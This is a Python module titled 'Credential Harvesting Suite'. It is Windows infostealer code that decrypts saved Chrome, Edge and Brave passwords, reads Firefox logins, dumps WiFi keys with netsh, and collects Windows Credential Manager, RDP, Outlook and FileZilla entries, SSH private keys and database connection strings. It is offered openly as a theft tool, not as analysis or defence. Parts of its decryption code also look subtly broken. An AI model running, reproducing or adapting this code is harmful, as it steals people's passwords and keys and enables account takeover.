"""
Credential Harvesting Suite
Advanced credential extraction from multiple sources
"""
import os
import json
import base64
import sqlite3
import subprocess
import tempfile
import shutil
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional
import winreg
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import hashlib

# Optional imports with fallbacks
try:
    import win32crypt
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

class CredentialHarvester:
    """Advanced credential harvesting from multiple sources"""
    
    def __init__(self):
        self.harvested_credentials = []
        self.browser_paths = {
            'chrome': [
                Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default",
                Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Profile 1"
            ],
            'edge': [
                Path.home() / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data" / "Default"
            ],
            'firefox': [
                Path.home() / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"
            ],
            'opera': [
                Path.home() / "AppData" / "Roaming" / "Opera Software" / "Opera Stable"
            ],
            'brave': [
                Path.home() / "AppData" / "Local" / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default"
            ]
        }
    
    def harvest_all_credentials(self) -> Dict:
        """Harvest credentials from all available sources"""
        try:
            results = {
                'timestamp': datetime.now().isoformat(),
                'browser_credentials': self.harvest_browser_credentials(),
                'windows_credentials': self.harvest_windows_credentials(),
                'wifi_passwords': self.harvest_wifi_passwords(),
                'rdp_credentials': self.harvest_rdp_credentials(),
                'ssh_keys': self.harvest_ssh_keys(),
                'email_credentials': self.harvest_email_credentials(),
                'ftp_credentials': self.harvest_ftp_credentials(),
                'database_connections': self.harvest_database_connections()
            }
            
            # Count total credentials found
            total_creds = 0
            for category, creds in results.items():
                if isinstance(creds, dict) and 'credentials' in creds:
                    total_creds += len(creds['credentials'])
                elif isinstance(creds, list):
                    total_creds += len(creds)
            
            results['total_credentials_found'] = total_creds
            results['success'] = True
            
            return results
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
    
    def harvest_browser_credentials(self) -> Dict:
        """Extract stored passwords from web browsers"""
        credentials = []
        
        try:
            # Chrome/Edge/Brave credentials
            for browser, paths in self.browser_paths.items():
                if browser in ['chrome', 'edge', 'brave']:
                    for profile_path in paths:
                        creds = self._extract_chromium_credentials(profile_path, browser)
                        credentials.extend(creds)
            
            # Firefox credentials
            firefox_creds = self._extract_firefox_credentials()
            credentials.extend(firefox_creds)
            
            return {
                'success': True,
                'credentials': credentials,
                'count': len(credentials)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'credentials': []
            }
    
    def _extract_chromium_credentials(self, profile_path: Path, browser_name: str) -> List[Dict]:
        """Extract credentials from Chromium-based browsers"""
        credentials = []
        
        if not profile_path.exists():
            return credentials
        
        login_db_path = profile_path / "Login Data"
        local_state_path = profile_path.parent / "Local State"
        
        if not login_db_path.exists():
            return credentials
        
        try:
            # Copy database to temp file
            with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as temp_file:
                temp_db = temp_file.name
                shutil.copy2(login_db_path, temp_db)
            
            # Get encryption key
            master_key = self._get_chrome_master_key(local_state_path)
            
            # Query credentials
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created, times_used
                FROM logins
                WHERE username_value != '' AND password_value != ''
            """)
            
            for row in cursor.fetchall():
                origin_url, username, encrypted_password, date_created, times_used = row
                
                # Decrypt password
                try:
                    if master_key and WIN32_AVAILABLE:
                        decrypted_password = self._decrypt_chrome_password(encrypted_password, master_key)
                    else:
                        decrypted_password = "[ENCRYPTED]"
                except:
                    decrypted_password = "[DECRYPT_FAILED]"
                
                credential = {
                    'source': f'{browser_name}_browser',
                    'type': 'browser_login',
                    'url': origin_url,
                    'username': username,
                    'password': decrypted_password,
                    'created_date': datetime.fromtimestamp(date_created / 1000000 + -11644473600).isoformat() if date_created else None,
                    'times_used': times_used
                }
                credentials.append(credential)
            
            conn.close()
            os.unlink(temp_db)
            
        except Exception as e:
            print(f"Error extracting {browser_name} credentials: {e}")
        
        return credentials
    
    def _get_chrome_master_key(self, local_state_path: Path) -> Optional[bytes]:
        """Get Chrome master key for password decryption"""
        if not local_state_path.exists() or not WIN32_AVAILABLE:
            return None
        
        try:
            with open(local_state_path, 'r') as f:
                local_state = json.load(f)
            
            encrypted_key = local_state['os_crypt']['encrypted_key']
            encrypted_key = base64.b64decode(encrypted_key)[5:]  # Remove 'DPAPI' prefix
            
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
            
        except Exception:
            return None
    
    def _decrypt_chrome_password(self, encrypted_password: bytes, master_key: bytes) -> str:
        """Decrypt Chrome password using master key"""
        try:
            # Check for v10 or v11 encryption
            if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
                # AES decryption
                nonce = encrypted_password[3:15]
                ciphertext = encrypted_password[15:]
                
                cipher = Cipher(
                    algorithms.AES(master_key),
                    modes.GCM(nonce),
                    backend=default_backend()
                )
                decryptor = cipher.decryptor()
                plaintext = decryptor.finalize_with_tag(ciphertext[:-16], ciphertext[-16:])
                return plaintext.decode('utf-8')
            else:
                # DPAPI decryption
                if WIN32_AVAILABLE:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)
                    return decrypted[1].decode('utf-8')
                
        except Exception:
            pass
        
        return "[DECRYPT_FAILED]"
    
    def _extract_firefox_credentials(self) -> List[Dict]:
        """Extract credentials from Firefox"""
        credentials = []
        
        firefox_profiles = Path.home() / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"
        
        if not firefox_profiles.exists():
            return credentials
        
        try:
            for profile_dir in firefox_profiles.iterdir():
                if profile_dir.is_dir():
                    logins_file = profile_dir / "logins.json"
                    if logins_file.exists():
                        with open(logins_file, 'r') as f:
                            logins_data = json.load(f)
                        
                        for login in logins_data.get('logins', []):
                            credential = {
                                'source': 'firefox_browser',
                                'type': 'browser_login',
                                'url': login.get('hostname', ''),
                                'username': login.get('encryptedUsername', '[ENCRYPTED]'),
                                'password': login.get('encryptedPassword', '[ENCRYPTED]'),
                                'created_date': datetime.fromtimestamp(login.get('timeCreated', 0) / 1000).isoformat() if login.get('timeCreated') else None,
                                'times_used': login.get('timesUsed', 0)
                            }
                            credentials.append(credential)
        except Exception as e:
            print(f"Error extracting Firefox credentials: {e}")
        
        return credentials
    
    def harvest_windows_credentials(self) -> Dict:
        """Extract Windows credential manager credentials"""
        credentials = []
        
        try:
            # Use cmdkey to list credentials
            result = subprocess.run(['cmdkey', '/list'], capture_output=True, text=True, shell=True)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                current_cred = {}
                
                for line in lines:
                    line = line.strip()
                    if line.startswith('Target:'):
                        if current_cred:
                            credentials.append(current_cred)
                            current_cred = {}
                        current_cred = {
                            'source': 'windows_credential_manager',
                            'type': 'windows_credential',
                            'target': line.split(':', 1)[1].strip(),
                            'username': '',
                            'password': '[PROTECTED]'
                        }
                    elif line.startswith('User:') and current_cred:
                        current_cred['username'] = line.split(':', 1)[1].strip()
                
                if current_cred:
                    credentials.append(current_cred)
            
            return {
                'success': True,
                'credentials': credentials,
                'count': len(credentials)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'credentials': []
            }
    
    def harvest_wifi_passwords(self) -> Dict:
        """Extract WiFi passwords"""
        passwords = []
        
        try:
            # Get WiFi profiles
            profiles_result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True, text=True, shell=True
            )
            
            if profiles_result.returncode == 0:
                lines = profiles_result.stdout.split('\n')
                
                for line in lines:
                    if "All User Profile" in line:
                        profile_name = line.split(':')[1].strip()
                        
                        # Get password for profile
                        pwd_result = subprocess.run(
                            ['netsh', 'wlan', 'show', 'profile', profile_name, 'key=clear'],
                            capture_output=True, text=True, shell=True
                        )
                        
                        if pwd_result.returncode == 0:
                            pwd_lines = pwd_result.stdout.split('\n')
                            password = None
                            
                            for pwd_line in pwd_lines:
                                if "Key Content" in pwd_line:
                                    password = pwd_line.split(':')[1].strip()
                                    break
                            
                            wifi_cred = {
                                'source': 'windows_wifi',
                                'type': 'wifi_password',
                                'ssid': profile_name,
                                'password': password or '[NO_PASSWORD]'
                            }
                            passwords.append(wifi_cred)
            
            return {
                'success': True,
                'credentials': passwords,
                'count': len(passwords)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'credentials': []
            }
    
    def harvest_rdp_credentials(self) -> Dict:
        """Extract saved RDP credentials"""
        credentials = []
        
        try:
            # Check registry for RDP connections
            rdp_key = r"SOFTWARE\Microsoft\Terminal Server Client\Servers"
            
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, rdp_key) as key:
                    i = 0
                    while True:
                        try:
                            server_name = winreg.EnumKey(key, i)
                            
                            server_key_path = f"{rdp_key}\\{server_name}"
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, server_key_path) as server_key:
                                try:
                                    username, _ = winreg.QueryValueEx(server_key, "UsernameHint")
                                    
                                    rdp_cred = {
                                        'source': 'windows_rdp',
                                        'type': 'rdp_credential',
                                        'server': server_name,
                                        'username': username,
                                        'password': '[PROTECTED]'
                                    }
                                    credentials.append(rdp_cred)
                                except FileNotFoundError:
                                    pass
                            
                            i += 1
                        except OSError:
                            break
            except FileNotFoundError:
                pass
            
            return {
                'success': True,
                'credentials': credentials,
                'count': len(credentials)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'credentials': []
            }
    
    def harvest_ssh_keys(self) -> Dict:
        """Extract SSH private keys"""
        keys = []
        
        try:
            ssh_dir = Path.home() / ".ssh"
            
            if ssh_dir.exists():
                for key_file in ssh_dir.iterdir():
                    if key_file.is_file() and not key_file.name.endswith('.pub'):
                        try:
                            with open(key_file, 'r') as f:
                                content = f.read()
                            
                            if "PRIVATE KEY" in content:
                                ssh_key = {
                                    'source': 'ssh_keys',
                                    'type': 'ssh_private_key',
                                    'filename': key_file.name,
                                    'path': str(key_file),
                                    'encrypted': 'Proc-Type: 4,ENCRYPTED' in content,
                                    'key_content': content[:200] + "..." if len(content) > 200 else content
                                }
                                keys.append(ssh_key)
                        except Exception:
                            continue
            
            return {
                'success': True,
                'credentials': keys,
                'count': len(keys)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'credentials': []
            }
    
    def harvest_email_credentials(self) -> Dict:
        """Extract email client credentials"""
        credentials = []
        
        try:
            # Outlook credentials from registry
            outlook_key = r"SOFTWARE\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676"
            
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, outlook_key) as key:
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            
                            # Look for email account subkeys
                            if len(subkey_name) == 32:  # Outlook account keys are 32 char hex
                                account_key_path = f"{outlook_key}\\{subkey_name}"
                                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, account_key_path) as account_key:
                                    try:
                                        email, _ = winreg.QueryValueEx(account_key, "Email")
                                        server, _ = winreg.QueryValueEx(account_key, "SMTP Server")
                                        
                                        email_cred = {
                                            'source': 'outlook_email',
                                            'type': 'email_credential',
                                            'email': email,
                                            'server': server,
                                            'password': '[PROTECTED]'
                                        }
                                        credentials.append(email_cred)
                                    except FileNotFoundError:
                                        pass
                            
                            i += 1
                        except OSError:
                            break
            except FileNotFoundError:
                pass
            
            return {
                'success': True,
                'credentials': credentials,
                'count': len(credentials)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'credentials': []
            }
    
    def harvest_ftp_credentials(self) -> Dict:
        """Extract FTP client credentials"""
        credentials = []
        
        try:
            # FileZilla credentials
            filezilla_config = Path.home() / "AppData" / "Roaming" / "FileZilla" / "sitemanager.xml"
            
            if filezilla_config.exists():
                try:
                    with open(filezilla_config, 'r') as f:
                        content = f.read()
                    
                    # Simple XML parsing for FTP sites
                    import xml.etree.ElementTree as ET
                    root = ET.fromstring(content)
                    
                    for server in root.findall('.//Server'):
                        host = server.find('Host')
                        user = server.find('User')
                        pass_elem = server.find('Pass')
                        
                        if host is not None and user is not None:
                            ftp_cred = {
                                'source': 'filezilla_ftp',
                                'type': 'ftp_credential',
                                'host': host.text,
                                'username': user.text,
                                'password': pass_elem.text if pass_elem is not None else '[NO_PASSWORD]'
                            }
                            credentials.append(ftp_cred)
                            
                except Exception:
                    pass
            
            return {
                'success': True,
                'credentials': credentials,
                'count': len(credentials)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'credentials': []
            }
    
    def harvest_database_connections(self) -> Dict:
        """Extract database connection strings"""
        connections = []
        
        try:
            # Common locations for database connection strings
            config_paths = [
                Path.cwd() / "appsettings.json",
                Path.cwd() / "web.config",
                Path.cwd() / "app.config",
                Path.home() / "Documents" / "*.config"
            ]
            
            for config_path in config_paths:
                if config_path.exists() and config_path.is_file():
                    try:
                        with open(config_path, 'r') as f:
                            content = f.read()
                        
                        # Look for connection strings
                        if "connectionString" in content.lower() or "server=" in content.lower():
                            db_conn = {
                                'source': 'database_config',
                                'type': 'database_connection',
                                'file': str(config_path),
                                'content_preview': content[:500] + "..." if len(content) > 500 else content
                            }
                            connections.append(db_conn)
                    except Exception:
                        continue
            
            return {
                'success': True,
                'credentials': connections,
                'count': len(connections)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'credentials': []
            }

# Global credential harvester instance
credential_harvester = CredentialHarvester()